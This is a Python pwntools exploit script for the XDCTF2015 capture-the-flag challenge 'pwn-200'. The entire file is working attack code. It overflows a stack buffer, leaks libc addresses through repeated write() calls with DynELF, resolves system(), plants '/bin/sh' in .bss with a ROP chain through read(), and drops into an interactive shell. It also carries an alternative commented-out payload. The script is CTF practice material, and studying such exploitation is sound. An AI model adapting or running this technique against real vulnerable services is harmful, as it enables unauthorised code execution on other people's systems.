import pwn

pwn.context(arch='i386', os='linux', log_level='warning')

p = pwn.process('./pwn-200')
e = pwn.ELF('./pwn-200')

bss_addr = e.bss()
start_addr = pwn.p32(0x080483d0)    # start() address
read_plt = pwn.p32(e.plt['read'])
write_plt = pwn.p32(e.plt['write'])
pop_3_addr = pwn.p32(0x0804856c)    # pop for 3 times(12 bytes)

# this function will be repeated many times, with diffrent `address`
# `address` parameter will be auto-added. It takes place of write_got, so we don't need write_got
def leak(address):
    # return to start() after execution
    payload = b'A' * 0x6c + b'B' * 4 + write_plt + start_addr + pwn.p32(1) + pwn.p32(address) + pwn.p32(4) # p32(4)这个数字居然可以任意修改，1-256都可以！
    p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload)
    data = p.recv(4)      # data = write(1, address, 4)
    return data

d = pwn.DynELF(leak=leak, elf=e)     # <class DynELF> 
system_addr = pwn.p32(d.lookup(symb='system', lib='libc'))

# read '/bin/sh\0' into bss_addr from STDIN, then return to system_addr
payload1 = b'A' * 0x6c + b'B' * 4 + read_plt + system_addr + pwn.p32(0) + pwn.p32(bss_addr) + pwn.p32(8)

#payload2 = b'A' * 0x6c + b'B' * 4 + read_plt + pop_3_addr + pwn.p32(0) + pwn.p32(bss_addr) + pwn.p32(8) 
#payload2 += system_addr + b'R' * 4 + pwn.p32(bss_addr)

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload1)  # or use payload2
p.sendline(b'/bin/sh\x00')

p.interactive()
